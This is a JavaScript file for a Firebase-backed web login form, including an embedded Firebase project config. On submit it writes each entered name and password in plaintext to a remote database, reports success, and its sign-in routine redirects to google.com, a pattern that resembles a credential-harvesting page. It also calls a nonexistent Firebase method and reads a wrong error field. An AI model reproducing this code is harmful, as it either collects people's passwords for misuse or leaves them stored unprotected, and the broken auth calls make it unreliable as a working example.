const firebaseConfig = {
  apiKey: "AIzaSyBccS9pBfi-tzMlYduyIlm-g8qZAjyIG60",
  authDomain: "login-e5438.firebaseapp.com",
  projectId: "login-e5438",
  storageBucket: "login-e5438.appspot.com",
  messagingSenderId: "13338895459",
  appId: "1:13338895459:web:30040ed0821b4364538456"
};


var datab  = firebase.database().ref('data');
function UserRegister(){
var email = document.getElementById('eemail').value;
var password = document.getElementById('lpassword').value;
var contact = document.getElementById('phone').value;
firebase.auth().createUserWithEmailPasswordAndcontact(email,password,contact).then(function(){
    
}).catch(function (error){
    var errorcode = error.code;
    var errormsg = error.message;
});
}
const auth = firebase.auth();
function SignIn(){
    var name = document.getElementById('name').value;
    var password = document.getElementById('lpassword').value;
    const promise = auth.signInWithEmailAndPassword(name,password);
    promise.catch( e => alert(e.msg));
    window.open("https://www.google.com","_self");
}
document.getElementById('form').addEventListener('submit', (e) => {
    e.preventDefault();
    var userInfo = datab.push();
    userInfo.set({
        name: getId('fname'),
        password : getId('lpassword'),
    });
    alert("Successfully login");
    console.log("sent");
    document.getElementById('form').reset();
});
function  getId(id){
    return document.getElementById(id).value;
}